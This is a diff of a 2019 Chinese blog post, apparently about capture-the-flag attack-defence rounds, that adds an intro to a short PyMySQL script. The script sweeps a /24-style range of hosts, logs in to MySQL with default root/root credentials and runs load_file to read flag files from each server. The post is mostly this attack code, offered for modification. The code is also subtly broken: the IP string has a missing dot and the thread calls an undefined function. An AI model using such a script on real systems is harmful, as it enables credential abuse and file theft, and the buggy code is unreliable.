@@ -21,18 +21,18 @@
     
     
     <meta name="keywords" content="Python脚本">
-    <meta name="description" content="这个还有点问题。可以自己修改下:) 1234567891011121314151617181920import pymysqlimport threadingfile=open(&apos;MySQLsave.txt&apos;,&apos;w+&apos;)def mysql_login(i):    ip=&apos;192.168.&apos;+str(i)+&apos;101&apos;    username=&apos;root&apos;    password=&apos;root&apos;">
+    <meta name="description" content="0x00 介绍突然想起来MYSQL是否也能做成自动GETFALG脚本呢。 这个还有点问题。可以自己修改下:) 1234567891011121314151617181920import pymysqlimport threadingfile=open(&apos;MySQLsave.txt&apos;,&apos;w+&apos;)def mysql_login(i):    ip=&apos;192.168.&apos;+str(i)+&apos;101&apos;">
 <meta name="keywords" content="Python脚本">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Python脚本:PyMySQL">
 <meta property="og:url" content="https://hu5k7.github.io/2019/09/17/Python脚本PyMySQL/index.html">
 <meta property="og:site_name" content="Hu5k7&#39;s Blog">
-<meta property="og:description" content="这个还有点问题。可以自己修改下:) 1234567891011121314151617181920import pymysqlimport threadingfile=open(&apos;MySQLsave.txt&apos;,&apos;w+&apos;)def mysql_login(i):    ip=&apos;192.168.&apos;+str(i)+&apos;101&apos;    username=&apos;root&apos;    password=&apos;root&apos;">
+<meta property="og:description" content="0x00 介绍突然想起来MYSQL是否也能做成自动GETFALG脚本呢。 这个还有点问题。可以自己修改下:) 1234567891011121314151617181920import pymysqlimport threadingfile=open(&apos;MySQLsave.txt&apos;,&apos;w+&apos;)def mysql_login(i):    ip=&apos;192.168.&apos;+str(i)+&apos;101&apos;">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-06-07T05:58:15.066Z">
+<meta property="og:updated_time" content="2019-09-24T17:14:46.772Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Python脚本:PyMySQL">
-<meta name="twitter:description" content="这个还有点问题。可以自己修改下:) 1234567891011121314151617181920import pymysqlimport threadingfile=open(&apos;MySQLsave.txt&apos;,&apos;w+&apos;)def mysql_login(i):    ip=&apos;192.168.&apos;+str(i)+&apos;101&apos;    username=&apos;root&apos;    password=&apos;root&apos;">
+<meta name="twitter:description" content="0x00 介绍突然想起来MYSQL是否也能做成自动GETFALG脚本呢。 这个还有点问题。可以自己修改下:) 1234567891011121314151617181920import pymysqlimport threadingfile=open(&apos;MySQLsave.txt&apos;,&apos;w+&apos;)def mysql_login(i):    ip=&apos;192.168.&apos;+str(i)+&apos;101&apos;">
     
     <link rel="shortcut icon" href="/img/favicon.ico">
     <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
@@ -155,6 +155,13 @@
 
 <div class="container body-wrap">
     
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0x00-介绍"><span class="post-toc-number">1.</span> <span class="post-toc-text">0x00 介绍</span></a></li></ol>
+        </nav>
+    </aside>
+
 
 <article id="post-Python脚本PyMySQL"
   class="post-article article-type-post fade" itemprop="blogPost">
@@ -177,7 +184,8 @@
 
         </div>
         <div class="post-content" id="post-content" itemprop="postContent">
-            <p>这个还有点问题。可以自己修改下:)</p>
+            <h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><p>突然想起来MYSQL是否也能做成自动GETFALG脚本呢。</p>
+<p>这个还有点问题。可以自己修改下:)</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">file=open(<span class="string">'MySQLsave.txt'</span>,<span class="string">'w+'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mysql_login</span><span class="params">(i)</span>:</span></span><br><span class="line">    ip=<span class="string">'192.168.'</span>+str(i)+<span class="string">'101'</span></span><br><span class="line">    username=<span class="string">'root'</span></span><br><span class="line">    password=<span class="string">'root'</span></span><br><span class="line">    payload = <span class="string">"SELECT load_file('C:/flag*.txt')"</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        db = pymysql.connect(ip,username,password,<span class="string">"mysql"</span>)</span><br><span class="line">        cursor = db.cursor()</span><br><span class="line">        cursor.execute(payload)</span><br><span class="line">        data = cursor.fetchall()</span><br><span class="line">        print(data)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">249</span>):</span><br><span class="line">    t = threading.Thread(target=mysql, args=(i,))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure>
 
 <p><strong>转载请标明出处</strong></p>
@@ -189,7 +197,7 @@
     <div class="content">
         
 <span class="post-time">
-    Last updated: <time datetime="2019-06-07T05:58:15.066Z" itemprop="dateUpdated">2019-06-07 05:58:15</time>
+    Last updated: <time datetime="2019-09-24T17:14:46.772Z" itemprop="dateUpdated">2019-09-24 17:14:46</time>
 </span><br>
 
 
